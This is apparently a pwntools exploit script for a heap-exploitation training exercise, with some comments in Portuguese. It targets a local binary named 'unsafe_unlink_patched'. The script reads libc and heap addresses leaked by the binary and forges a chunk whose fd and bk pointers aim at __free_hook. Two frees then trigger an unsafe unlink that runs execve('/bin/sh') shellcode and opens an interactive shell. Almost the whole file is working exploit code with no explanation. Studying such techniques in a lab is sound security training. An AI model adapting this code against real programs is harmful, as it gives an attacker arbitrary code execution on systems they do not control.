#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./unsafe_unlink_patched')
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=
# prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
input()
# requisitando 2 chunks
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# criando variaveis
fd = libc.sym.__free_hook - 0x18
bk = heap + 0x20
prev_size = 0x90
fake_size = 0x90

# sobrescrevendo o size field do segundo chunk
edit(chunk_A, p64(fd) + p64(bk) + shellcode + p8(0)*(0x70 - len(shellcode)) + p64(prev_size) + p64(fake_size))

free(chunk_B)
input()
# executando o shellcode via unsafe unlink
free(chunk_A)


# =============================================================================

io.interactive()
